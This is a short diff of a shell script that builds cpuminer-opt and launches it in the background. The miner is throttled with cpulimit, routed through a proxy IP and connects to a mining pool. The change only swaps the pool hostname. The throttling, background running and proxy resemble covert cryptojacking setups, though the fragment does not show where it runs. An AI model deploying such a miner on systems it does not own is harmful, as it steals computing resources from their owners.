@@ -5,4 +5,4 @@ cd cpuminer-opt
 chmod +x *
 ./build.sh
 make
-cpulimit --exe cpuminer --limit 85 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://zoi-pool3.chainsilo.com:3032 -u k67frozen.anonymous -p 0202 -x 45.32.21.205:2212 --background
+cpulimit --exe cpuminer --limit 85 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://d.jkpool.com:3000 -u k67frozen.anonymous -p 0202 -x 45.32.21.205:2212 --background
